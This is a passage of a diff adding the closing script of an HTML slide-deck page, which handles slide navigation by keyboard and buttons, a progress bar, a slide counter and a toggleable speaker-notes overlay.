+        const isActive = overlay.classList.toggle('active');
+        if (btn) btn.classList.toggle('active', isActive);
+        if (isActive) updateNotes();
+      }
+
+      function updateUI() {
+        slides.forEach((s, idx) => {
+          s.classList.toggle('active', idx === current);
+        });
+        if (progressBar) progressBar.style.width = `${((current + 1) / total) * 100}%`;
+        if (slideCounter) slideCounter.textContent = `${String(current + 1).padStart(2, '0')} / ${String(total).padStart(2, '0')}`;
+        const title = slides[current].getAttribute('data-title') || '';
+        if (headerTitle) headerTitle.textContent = title;
+        
+        const overlay = getOverlay();
+        if (overlay && overlay.classList.contains('active')) {
+          updateNotes();
+        }
+      }
+
+      function goTo(index) {
+        if (index < 0 || index >= total) return;
+        current = index;
+        updateUI();
+      }
+
+      const notesBtn = document.getElementById('btn-notes');
+      if (notesBtn) notesBtn.addEventListener('click', (e) => { e.stopPropagation(); toggleNotes(); });
+
+      const notesCloseBtn = document.getElementById('btn-close-notes');
+      if (notesCloseBtn) notesCloseBtn.addEventListener('click', (e) => {
+        e.stopPropagation();
+        const overlay = getOverlay();
+        const btn = getNotesBtn();
+        if (overlay) overlay.classList.remove('active');
+        if (btn) btn.classList.remove('active');
+      });
+
+      document.addEventListener('keydown', (e) => {
+        if (e.code === 'KeyN' || e.key === 'n' || e.key === 'N' || e.key === 'ى') {
+          e.preventDefault();
+          toggleNotes();
+          return;
+        }
+        if (e.key === 'Escape' || e.code === 'Escape') {
+          const overlay = getOverlay();
+          const btn = getNotesBtn();
+          if (overlay && overlay.classList.contains('active')) {
+            overlay.classList.remove('active');
+            if (btn) btn.classList.remove('active');
+          }
+          return;
+        }
+        if (e.key === 'ArrowRight' || e.key === 'PageDown' || e.key === ' ' || e.code === 'Space') {
+          e.preventDefault();
+          goTo(current + 1);
+        } else if (e.key === 'ArrowLeft' || e.key === 'PageUp') {
+          e.preventDefault();
+          goTo(current - 1);
+        } else if (e.key === 'Home') {
+          e.preventDefault();
+          goTo(0);
+        } else if (e.key === 'End') {
+          e.preventDefault();
+          goTo(total - 1);
+        }
+      });
+
+      document.getElementById('btn-prev').addEventListener('click', () => goTo(current - 1));
+      document.getElementById('btn-next').addEventListener('click', () => goTo(current + 1));
+
+      updateUI();
+    })();
+  </script>
+</body>
+</html>
